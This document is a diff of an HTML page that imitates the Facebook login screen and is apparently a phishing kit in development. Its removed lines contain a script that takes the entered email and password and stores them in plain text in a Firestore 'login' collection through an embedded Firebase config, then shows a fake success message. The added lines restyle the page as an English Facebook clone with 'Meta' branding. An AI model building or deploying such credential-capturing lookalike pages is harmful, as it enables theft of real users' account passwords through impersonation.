@@ -1,122 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Login Facebook Style</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <!-- SweetAlert -->
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f0f2f5;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .container {
-      background: white;
-      padding: 20px;
-      width: 300px;
-      border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-
-    .logo {
-      color: #1877f2;
-      font-size: 32px;
-      font-weight: bold;
-      margin-bottom: 20px;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-    }
-
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #1877f2;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background: #166fe5;
-    }
-  </style>
-</head>
-
 <body>
 
-<div class="container">
-  <div class="logo">facebook</div>
-  <input type="text" id="email" placeholder="Email atau nomor HP">
-  <input type="password" id="password" placeholder="Kata sandi">
-  <button id="loginBtn">Masuk</button>
+<div class="main">
+  
+  <!-- KIRI -->
+  <div class="left">
+    <div class="logo">facebook</div>
+    <p class="tagline">Explore the things <span>you love.</span></p>
+  </div>
+
+  <!-- KANAN -->
+  <div class="right">
+    <div class="login-box">
+      <h3>Log in to Facebook</h3>
+      
+      <input type="text" id="email" placeholder="Email address or mobile number">
+      <input type="password" id="password" placeholder="Password">
+
+      <button id="loginBtn">Log in</button>
+
+      <p class="forgot">Forgotten password?</p>
+
+      <hr>
+
+      <button class="create">Create new account</button>
+
+      <p class="meta">Meta</p>
+    </div>
+  </div>
+
 </div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyDfs59hRYtUtFG3dVMZ3aGTIm3FvvbDnx8",
-  authDomain: "test-bf56f.firebaseapp.com",
-  projectId: "test-bf56f",
-  storageBucket: "test-bf56f.firebasestorage.app",
-  messagingSenderId: "276624363412",
-  appId: "1:276624363412:web:b232a9df7bf64e4edac981"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-// tombol login
-document.getElementById("loginBtn").addEventListener("click", async () => {
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
-
-  if (email === "" || password === "") {
-    Swal.fire("Isi dulu email & password!");
-    return;
-  }
-
-  try {
-    await addDoc(collection(db, "login"), {
-      email: email,
-      password: password,
-      waktu: new Date()
-    });
-
-    Swal.fire({
-      icon: "success",
-      title: "Login Berhasil",
-      text: "Selamat datang!"
-    });
-
-  } catch (e) {
-    console.error(e);
-    Swal.fire({
-      icon: "error",
-      title: "Error",
-      text: e.message
-    });
-  }
-});
-</script>
-
 </body>
-</html>
